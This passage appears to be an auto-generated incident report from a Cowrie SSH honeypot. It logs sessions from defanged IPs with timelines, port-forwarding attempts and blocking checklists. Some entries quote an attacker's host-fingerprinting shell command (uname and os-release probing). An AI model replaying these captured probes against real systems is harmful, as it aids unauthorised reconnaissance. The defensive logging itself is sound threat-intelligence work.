| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:22:25` | `cowrie.session.connect` |
| `2026-08-24 04:22:25` | `cowrie.client.version` |
| `2026-08-24 04:22:25` | `cowrie.client.kex` |
| `2026-08-24 04:22:26` | `cowrie.login.success` |
| `2026-08-24 04:22:26` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:22:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:22:27` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b81677bb545d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-08-24 04:22 |
| **Last Seen** | 2026-08-24 04:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:22:26` | `cowrie.session.connect` |
| `2026-08-24 04:22:26` | `cowrie.client.version` |
| `2026-08-24 04:22:26` | `cowrie.client.kex` |
| `2026-08-24 04:22:28` | `cowrie.login.success` |
| `2026-08-24 04:22:28` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:22:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66aa4fd1d83d

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-08-24 04:27 |
| **Last Seen** | 2026-08-24 04:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:27:05` | `cowrie.session.connect` |
| `2026-08-24 04:27:05` | `cowrie.client.version` |
| `2026-08-24 04:27:05` | `cowrie.client.kex` |
| `2026-08-24 04:27:06` | `cowrie.login.success` |
| `2026-08-24 04:27:07` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4698c10c7f40

| Field | Detail |
|---|---|
| **Source IP** | `180.151.254[.]217` |
| **First Seen** | 2026-08-24 04:27 |
| **Last Seen** | 2026-08-24 04:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:27:12` | `cowrie.session.connect` |
| `2026-08-24 04:27:13` | `cowrie.client.version` |
| `2026-08-24 04:27:13` | `cowrie.client.kex` |
| `2026-08-24 04:27:14` | `cowrie.login.success` |
| `2026-08-24 04:27:15` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.151.254[.]217` to AbuseIPDB if not already reported
- [ ] Block `180.151.254[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f64ea705fd9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:31 |
| **Last Seen** | 2026-08-24 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:31:48` | `cowrie.session.connect` |
| `2026-08-24 04:31:48` | `cowrie.client.version` |
| `2026-08-24 04:31:48` | `cowrie.client.kex` |
| `2026-08-24 04:31:49` | `cowrie.login.success` |
| `2026-08-24 04:31:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:31:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:31:49` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e18db11911e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:31 |
| **Last Seen** | 2026-08-24 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:31:51` | `cowrie.session.connect` |
| `2026-08-24 04:31:51` | `cowrie.client.version` |
| `2026-08-24 04:31:52` | `cowrie.client.kex` |
| `2026-08-24 04:31:52` | `cowrie.login.success` |
| `2026-08-24 04:31:53` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:31:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:31:53` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe8037baa6c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 04:36 |
| **Last Seen** | 2026-08-24 04:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:36:57` | `cowrie.session.connect` |
| `2026-08-24 04:36:57` | `cowrie.client.version` |
| `2026-08-24 04:36:57` | `cowrie.client.kex` |
| `2026-08-24 04:36:58` | `cowrie.login.success` |
| `2026-08-24 04:36:58` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:36:58` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7f0fcb16e10

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 04:39 |
| **Last Seen** | 2026-08-24 04:39 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:39:22` | `cowrie.session.connect` |
| `2026-08-24 04:39:24` | `cowrie.client.version` |
| `2026-08-24 04:39:24` | `cowrie.client.kex` |
| `2026-08-24 04:39:30` | `cowrie.login.success` |
| `2026-08-24 04:39:34` | `cowrie.session.params` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:34` | `cowrie.command.success` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:34` | `cowrie.command.input` |
| `2026-08-24 04:39:35` | `cowrie.log.closed` |
| `2026-08-24 04:39:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f949e722428

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:41 |
| **Last Seen** | 2026-08-24 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:41:19` | `cowrie.session.connect` |
| `2026-08-24 04:41:19` | `cowrie.client.version` |
| `2026-08-24 04:41:19` | `cowrie.client.kex` |
| `2026-08-24 04:41:20` | `cowrie.login.success` |
| `2026-08-24 04:41:20` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:41:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:41:20` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6ca1555054c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:41 |
| **Last Seen** | 2026-08-24 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:41:23` | `cowrie.session.connect` |
| `2026-08-24 04:41:23` | `cowrie.client.version` |
| `2026-08-24 04:41:23` | `cowrie.client.kex` |
| `2026-08-24 04:41:24` | `cowrie.login.success` |
| `2026-08-24 04:41:24` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:41:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:41:24` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d219f9c71c5a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.90[.]166` |
| **First Seen** | 2026-08-24 04:41 |
| **Last Seen** | 2026-08-24 04:46 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:41:55` | `cowrie.session.connect` |
| `2026-08-24 04:41:57` | `cowrie.client.version` |
| `2026-08-24 04:41:57` | `cowrie.client.kex` |
| `2026-08-24 04:41:58` | `cowrie.login.success` |
| `2026-08-24 04:46:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `120.48.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb1b3a75a49

| Field | Detail |
|---|---|
| **Source IP** | `177.244.29[.]30` |
| **First Seen** | 2026-08-24 04:42 |
| **Last Seen** | 2026-08-24 04:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:42:32` | `cowrie.session.connect` |
| `2026-08-24 04:42:33` | `cowrie.client.version` |
| `2026-08-24 04:42:33` | `cowrie.client.kex` |
| `2026-08-24 04:42:35` | `cowrie.login.success` |
| `2026-08-24 04:42:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.244.29[.]30` to AbuseIPDB if not already reported
- [ ] Block `177.244.29[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c35e6d2d0a

| Field | Detail |
|---|---|
| **Source IP** | `207.175.114[.]79` |
| **First Seen** | 2026-08-24 04:43 |
| **Last Seen** | 2026-08-24 04:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:43:26` | `cowrie.session.connect` |
| `2026-08-24 04:43:26` | `cowrie.login.success` |
| `2026-08-24 04:43:27` | `cowrie.session.params` |
| `2026-08-24 04:43:27` | `cowrie.command.input` |
| `2026-08-24 04:43:27` | `cowrie.command.input` |
| `2026-08-24 04:43:27` | `cowrie.command.failed` |
| `2026-08-24 04:43:27` | `cowrie.command.input` |
| `2026-08-24 04:43:27` | `cowrie.log.closed` |
| `2026-08-24 04:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.114[.]79` to AbuseIPDB if not already reported
- [ ] Block `207.175.114[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a181e8f5579

| Field | Detail |
|---|---|
| **Source IP** | `207.175.114[.]79` |
| **First Seen** | 2026-08-24 04:43 |
| **Last Seen** | 2026-08-24 04:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:43:35` | `cowrie.session.connect` |
| `2026-08-24 04:43:35` | `cowrie.login.success` |
| `2026-08-24 04:43:35` | `cowrie.session.params` |
| `2026-08-24 04:43:35` | `cowrie.command.input` |
| `2026-08-24 04:43:35` | `cowrie.command.failed` |
| `2026-08-24 04:43:46` | `cowrie.log.closed` |
| `2026-08-24 04:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.114[.]79` to AbuseIPDB if not already reported
- [ ] Block `207.175.114[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16f38e412857

| Field | Detail |
|---|---|
| **Source IP** | `207.175.114[.]79` |
| **First Seen** | 2026-08-24 04:43 |
| **Last Seen** | 2026-08-24 04:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:43:37` | `cowrie.session.connect` |
| `2026-08-24 04:43:37` | `cowrie.login.success` |
| `2026-08-24 04:43:37` | `cowrie.session.params` |
| `2026-08-24 04:43:37` | `cowrie.command.input` |
| `2026-08-24 04:43:46` | `cowrie.log.closed` |
| `2026-08-24 04:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.114[.]79` to AbuseIPDB if not already reported
- [ ] Block `207.175.114[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82743114c8bf

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 04:43 |
| **Last Seen** | 2026-08-24 04:44 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:43:41` | `cowrie.session.connect` |
| `2026-08-24 04:43:43` | `cowrie.client.version` |
| `2026-08-24 04:43:43` | `cowrie.client.kex` |
| `2026-08-24 04:44:00` | `cowrie.login.success` |
| `2026-08-24 04:44:11` | `cowrie.session.params` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:11` | `cowrie.command.success` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:11` | `cowrie.command.input` |
| `2026-08-24 04:44:16` | `cowrie.log.closed` |
| `2026-08-24 04:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-370dbc755294

| Field | Detail |
|---|---|
| **Source IP** | `121.164.135[.]251` |
| **First Seen** | 2026-08-24 04:45 |
| **Last Seen** | 2026-08-24 04:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:45:30` | `cowrie.session.connect` |
| `2026-08-24 04:45:31` | `cowrie.client.version` |
| `2026-08-24 04:45:31` | `cowrie.client.kex` |
| `2026-08-24 04:45:34` | `cowrie.login.success` |
| `2026-08-24 04:45:35` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.164.135[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.164.135[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e8b13c8b431

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-08-24 04:45 |
| **Last Seen** | 2026-08-24 04:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:45:41` | `cowrie.session.connect` |
| `2026-08-24 04:45:42` | `cowrie.client.version` |
| `2026-08-24 04:45:42` | `cowrie.client.kex` |
| `2026-08-24 04:45:44` | `cowrie.login.success` |
| `2026-08-24 04:45:45` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ffef3a54470

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-24 04:47 |
| **Last Seen** | 2026-08-24 04:47 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:47:37` | `cowrie.session.connect` |
| `2026-08-24 04:47:39` | `cowrie.client.version` |
| `2026-08-24 04:47:39` | `cowrie.client.kex` |
| `2026-08-24 04:47:44` | `cowrie.login.success` |
| `2026-08-24 04:47:53` | `cowrie.session.params` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:53` | `cowrie.command.success` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:53` | `cowrie.command.input` |
| `2026-08-24 04:47:56` | `cowrie.log.closed` |
| `2026-08-24 04:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9584603b5ef0

| Field | Detail |
|---|---|
| **Source IP** | `180.183.248[.]41` |
| **First Seen** | 2026-08-24 04:50 |
| **Last Seen** | 2026-08-24 04:50 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:50:25` | `cowrie.session.connect` |
| `2026-08-24 04:50:29` | `cowrie.client.version` |
| `2026-08-24 04:50:29` | `cowrie.client.kex` |
| `2026-08-24 04:50:35` | `cowrie.login.success` |
| `2026-08-24 04:50:36` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.183.248[.]41` to AbuseIPDB if not already reported
- [ ] Block `180.183.248[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0b3a3f0f200

| Field | Detail |
|---|---|
| **Source IP** | `138.122.242[.]42` |
| **First Seen** | 2026-08-24 04:50 |
| **Last Seen** | 2026-08-24 04:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:50:46` | `cowrie.session.connect` |
| `2026-08-24 04:50:47` | `cowrie.client.version` |
| `2026-08-24 04:50:47` | `cowrie.client.kex` |
| `2026-08-24 04:50:49` | `cowrie.login.success` |
| `2026-08-24 04:50:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.122.242[.]42` to AbuseIPDB if not already reported
- [ ] Block `138.122.242[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d03b0e7b3ac

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 04:50 |
| **Last Seen** | 2026-08-24 04:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 04:50:48` | `cowrie.session.connect` |
| `2026-08-24 04:50:48` | `cowrie.client.version` |
| `2026-08-24 04:50:48` | `cowrie.client.kex` |
| `2026-08-24 04:50:49` | `cowrie.login.success` |
| `2026-08-24 04:50:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 04:50:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 04:50:49` | `cowrie.direct-tcpip.data` |
| `2026-08-24 04:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
